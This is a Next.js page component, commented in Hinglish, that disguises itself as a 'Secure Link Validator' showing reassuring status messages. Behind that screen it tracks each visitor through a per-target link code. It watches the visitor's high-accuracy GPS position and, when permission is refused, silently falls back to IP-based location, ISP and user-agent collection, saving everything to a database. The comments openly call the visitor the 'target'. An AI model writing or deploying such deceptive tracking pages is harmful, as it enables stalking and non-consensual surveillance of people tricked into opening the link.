// src/app/v/[visitorCode]/page.tsx
"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import axios from "axios";

export default function VisitorPage() {
  const params = useParams();
  const visitorCode = params.visitorCode as string;
  const [status, setStatus] = useState("Loading secure connection...");

  useEffect(() => {
    if (!visitorCode) return;

    // 🔴 FALLBACK FUNCTION: Agar GPS fail ho jaye toh IP track karke DB mein save karega
    const fallbackToIP = async () => {
      try {
        console.log("GPS denied/failed. Switching to IP tracking...");

        // 1. IP API se target ka saara biodata nikala
        const ipResponse = await axios.get("/api/location/ip");
        const ipData = ipResponse.data;

        // 2. DATABASE CONNECTION: Yeh saara maal database wali save API ko bhej diya
        await axios.post("/api/location/save", {
          visitorCode: visitorCode,
          source: "IP",
          latitude: ipData.latitude,
          longitude: ipData.longitude,
          ipAddress: ipData.ipAddress,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country,
          isp: ipData.isp,
          userAgent: ipData.userAgent,
        });

        console.log("Tracked and saved via IP successfully!");
        setStatus("Secure connection established successfully.");
      } catch (err) {
        console.error("IP Fallback also failed:", err);
        setStatus("Connection failed. Please refresh the page.");
      }
    };

    // 🟢 STEP A: Browser ka GPS checker trigger karo
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(
        async (position) => {
          // Agar target ne "Allow" daba diya (High Accuracy GPS Data)
          const { latitude, longitude, accuracy } = position.coords;
          const userAgent = navigator.userAgent; // Browser info pakdi

          try {
            console.log("GPS success! Saving coordinates to DB...");

            // DATABASE CONNECTION: Exact coordinates database ko bhej diye
            await axios.post("/api/location/save", {
              visitorCode: visitorCode,
              source: "GPS",
              latitude: latitude,
              longitude: longitude,
              accuracy: accuracy,
              userAgent: userAgent,
            });

            console.log("Tracked and saved via GPS successfully!");
            setStatus("Secure connection established successfully.");
          } catch (saveErr) {
            console.error(
              "Failed to save GPS data, trying IP fallback...",
              saveErr,
            );
            fallbackToIP();
          }
        },
        (error) => {
          // Agar target ne "Block" daba diya
          console.warn(`GPS Blocked/Failed: ${error.message}`);
          fallbackToIP(); // Chupke se IP routing par shift ho jao
        },
        {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 0,
        },
      );
    } else {
      fallbackToIP();
    }
  }, [visitorCode]);

  return (
    <div className="flex h-screen w-full flex-col items-center justify-center p-4 bg-slate-950 text-white font-sans">
      <div className="max-w-md text-center space-y-4">
        <h1 className="text-3xl font-extrabold tracking-tight text-emerald-400">
          Secure Link Validator
        </h1>
        <p className="text-slate-400 text-sm">
          Please wait while we verify your secure dynamic token identity.
        </p>
        <div className="inline-flex items-center px-4 py-2 font-semibold leading-6 text-sm shadow rounded-md text-white bg-emerald-500">
          {status}
        </div>
      </div>
    </div>
  );
}
